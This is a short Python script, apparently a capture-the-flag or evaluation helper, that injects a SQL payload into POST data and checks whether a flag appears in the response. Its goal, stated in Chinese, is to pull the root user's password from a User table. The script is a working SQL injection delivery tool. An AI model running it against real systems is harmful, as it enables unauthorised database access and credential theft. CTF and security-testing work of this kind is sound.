import re
import requests

from urllib.parse import urljoin
from logger import logger

def sanitize_payload(url, payload):
    if not "root" in payload:
        logger.warning(f"No `root` found in payload. ")
        return None
    if payload.endswith("--"):
        logger.info("payload not end with space, add space")
        payload += " "
    return payload

def expolit(url, payload_type, payload, payload_data):
    assert payload_type == "command"
    payload = sanitize_payload(url, payload)
    if payload is None:
        return None, "要求获取 User 表中 user=root 的 password 字段数据。"
    url = payload_data["url"]
    logger.info(f"in function sql_inject, {url = }")
    logger.info(f"in function sql_inject, {payload = }")
    logger.info(f"in function sql_inject, {payload_data = }")
    headers = payload_data["headers"]
    data = payload_data["data"].replace("payload", payload)
    logger.info(f"in function sql_inject, data = {data}")
    response = requests.post(url, data=data, headers=headers)
    logger.info(f"{response = }")
    # logger.info(f"in function sql_inject, response.text = {response.text}")
    logger.error(f"in function sql_inject, flag in response.txt: {'flag' in response.text}")
    if response.status_code == 200:
        return response.text, None
    else:
        return None, None
